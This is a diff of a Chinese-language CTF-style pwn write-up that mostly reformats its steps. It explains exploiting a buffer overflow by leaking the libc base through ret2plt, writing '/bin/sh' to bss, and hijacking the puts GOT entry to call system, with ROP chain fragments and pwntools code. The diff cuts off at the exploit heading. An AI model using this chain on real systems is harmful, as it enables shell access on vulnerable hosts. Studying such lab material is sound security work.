@@ -42,45 +42,46 @@ int main(){
     ```
     首先知道這隻binary是動態link library，所以可想而知，rop gadget一定少的可憐，所以我們不太能夠直接像上一題一樣暴力開一個shell出來，程式也沒有幫我們開，讓我們可以直接跳過去
 2. 還是有很明顯的BOF的漏洞，此時就可以嘗試類似got hijack的方式打看看
-流程:
-1. 首先我們要知道libc base address才能夠利用扣掉offset的方式跳到system的地方，但是程式中並沒有能夠直接leak base address給我們的東西，因此我們可以自己想辦法leak: ==ret2plt==
-    ```
-    pop rdi ret
-    puts got address
-    puts plt
-    ```
-    這三行的意思是把puts的got address，透過puts印出來給我們 -> puts(put自己的got address)
-2. 有了puts的got address之後，就可以扣掉puts在libc的offset，就可以知道base address，然後我們可以知道system的確切address
-    ```python
-    # leak puts got address to calculate libc base address
-    puts_addr = u64(r.recv(6).ljust(8, b'\x00'))
-    libc_base = puts_addr - libc.symbols['puts']
-    libc.address = libc_base
-    system_addr = libc.symbols['system']
-    ```
-3. 現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有`/bin/sh`或是`/sh`的string，不過我們可以直接用同樣的方法，把字串送進去
-    ```python
-    # fetch user input -> /bin/sh\x00
-    pop_rdi_ret
-    bss_addr
-    gets_plt,
-    ```
-    此時他就會像使用者要輸入，並把我們的輸入丟到bss address
-4. 另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking==
-    ```python
-    # fetch user input -> system address
-    pop_rdi_ret
-    puts_got
-    gets_plt
-    ```
-    此時我們可以輸入system的address，經過這三行後我們就成功把puts got address換成system got address
-5. 所有工具都準備好了，接下來只要呼叫puts就可以了，實際上就是呼叫system
-    ```python
-    # system('/bin/sh\x00')
-    pop_rdi_ret
-    bss_addr
-    puts_plt
-    ```
+
+    流程:
+    1. 首先我們要知道libc base address才能夠利用扣掉offset的方式跳到system的地方，但是程式中並沒有能夠直接leak base address給我們的東西，因此我們可以自己想辦法leak: <span style="background-color: yellow">ret2plt</span>
+        ```
+        pop rdi ret
+        puts got address
+        puts plt
+        ```
+        這三行的意思是把puts的got address，透過puts印出來給我們 → puts(put自己的got address)
+    2. 有了puts的got address之後，就可以扣掉puts在libc的offset，就可以知道base address，然後我們可以知道system的確切address
+        ```python
+        # leak puts got address to calculate libc base address
+        puts_addr = u64(r.recv(6).ljust(8, b'\x00'))
+        libc_base = puts_addr - libc.symbols['puts']
+        libc.address = libc_base
+        system_addr = libc.symbols['system']
+        ```
+    3. 現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有`/bin/sh`或是`/sh`的string，不過我們可以直接用同樣的方法，把字串送進去
+        ```python
+        # fetch user input -> /bin/sh\x00
+        pop_rdi_ret
+        bss_addr
+        gets_plt,
+        ```
+        此時他就會像使用者要輸入，並把我們的輸入丟到bss address
+    4. 另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking==
+        ```python
+        # fetch user input -> system address
+        pop_rdi_ret
+        puts_got
+        gets_plt
+        ```
+        此時我們可以輸入system的address，經過這三行後我們就成功把puts got address換成system got address
+    5. 所有工具都準備好了，接下來只要呼叫puts就可以了，實際上就是呼叫system
+        ```python
+        # system('/bin/sh\x00')
+        pop_rdi_ret
+        bss_addr
+        puts_plt
+        ```
 
 ## Exploit - Ret2Plt(leak base address) + Got Hijack(call system)
 ```python
